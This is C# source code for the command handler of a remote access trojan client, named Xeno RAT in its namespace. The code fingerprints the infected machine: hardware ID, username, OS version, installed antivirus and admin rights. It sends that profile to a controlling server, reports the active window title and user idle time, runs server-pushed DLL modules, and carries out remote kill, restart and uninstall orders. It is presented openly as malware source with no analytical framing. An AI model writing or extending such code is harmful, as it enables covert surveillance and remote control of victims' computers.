using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class Handler
    {
        Node Main;
        DllHandler dllhandler;
        public Handler(Node _Main, DllHandler _dllhandler) 
        {
            dllhandler = _dllhandler;
            Main = _Main;
        }
        public async Task CreateSubSock(byte[] data)
        {
            try
            {
                int type = data[1];
                int retid = data[2];
                Node sub = await Main.ConnectSubSockAsync(type, retid, OnDisconnect);
                sub.Parent = Main;
                Main.AddSubNode(sub);
                if (sub.SockType == 1)
                {
                    await Type1Receive(sub);
                }
                else if (sub.SockType == 2)
                {
                    await Type2Receive(sub);
                }
                else
                {
                    if (sub == null) return;
                    sub.Disconnect();
                }
            }
            catch 
            {
                Console.WriteLine("error with subnode, subnode type=" + data[1]);
            }
        }
        private void OnDisconnect(Node SubNode) 
        { 
            
        }

        private async Task GetAndSendInfo(Node Type0) 
        {
            if (Type0.SockType != 0) 
            {
                return;
            }
            //get hwid, username etc. separated by null
            string clientversion = "1.8.7";//find a way to get the client version.
            string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
            byte[] data = new byte[0];
            byte[] nullbyte = new byte[] { 0 };
            for(int i=0;i<info.Length;i++) 
            {
                byte[] byte_data = Encoding.UTF8.GetBytes(info[i]);
                data = SocketHandler.Concat(data, byte_data);
                if (i != info.Length - 1) 
                {
                    data = SocketHandler.Concat(data, nullbyte);
                }
            }
            await Type0.SendAsync(data);
        }

        public async Task Type0Receive()
        {
            while (Main.Connected())
            {
                byte[] data = await Main.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        CreateSubSock(data);
                        break;
                    case 1:
                        await GetAndSendInfo(Main);
                        break;
                    case 2:
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 3:
                        Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
                        Process.GetCurrentProcess().Kill();
                        break;
                    case 4:
                        await Utils.Uninstall();
                        break;
                }
            }
            Main.Disconnect();
        }
        public async Task Type1Receive(Node subServer)
        {
            byte[] HearbeatReply = new byte[] { 1 };
            byte[] HearbeatFail = new byte[] { 2 };
            subServer.SetRecvTimeout(5000);
            while (subServer.Connected() && Main.Connected())
            {
                await Task.Delay(1000);
                byte[] data = await subServer.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                int opcode = data[0];
                if (opcode != 0) 
                {
                    await subServer.SendAsync(HearbeatFail);
                    break;
                }
                await subServer.SendAsync(HearbeatReply);
            }
            Main.Disconnect();
            subServer.Disconnect();
        }
        private async Task setSetId(Node subServer, byte[] data) 
        {
            byte[] worked = new byte[] { 1 };
            subServer.SetId = subServer.sock.BytesToInt(data, 1);
            await subServer.SendAsync(worked);

        }
        public async Task Type2Receive(Node subServer)
        {
            while (subServer.Connected() && Main.Connected())
            {
                byte[] data =await subServer.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                int opcode = data[0];
                switch (opcode)
                {
                    case 0:
                        await SendUpdateInfo(subServer);
                        break;
                    case 1:
                        await dllhandler.DllNodeHandler(subServer);
                        goto outofwhileloop;
                    case 2:
                        await setSetId(subServer,data);
                        break;
                    case 3:
                        return;
                    case 4:
                        await DebugMenu(subServer, data);
                        break;

                }
            }
            outofwhileloop:
            subServer.Disconnect();
        }

        public async Task DebugMenu(Node subServer, byte[] data) 
        {
            int opcode = data[1];
            switch (opcode) 
            {
                case 0:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
                    break;//get dlls
                case 1:
                    string assm=Encoding.UTF8.GetString(data.Skip(2).ToArray());
                    bool worked = false;
                    if (dllhandler.Assemblies.Keys.Contains(assm)) 
                    {
                        worked=dllhandler.Assemblies.Remove(assm);
                    }

                    await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
                    break;//unload dll
                case 2:
                    await subServer.SendAsync(Encoding.UTF8.GetBytes(Program.ProcessLog.ToString()));
                    break;//get console log
            }
        }

        public async Task SendUpdateInfo(Node node) 
        {
            string currwin = await Utils.GetCaptionOfActiveWindowAsync();
            string idleTime = ((await Utils.GetIdleTimeAsync()) /1000).ToString();
            string update_data = currwin + "\n" + idleTime;
            byte[] data=Encoding.UTF8.GetBytes(update_data);
            await node.SendAsync(data);
        }

    }
}
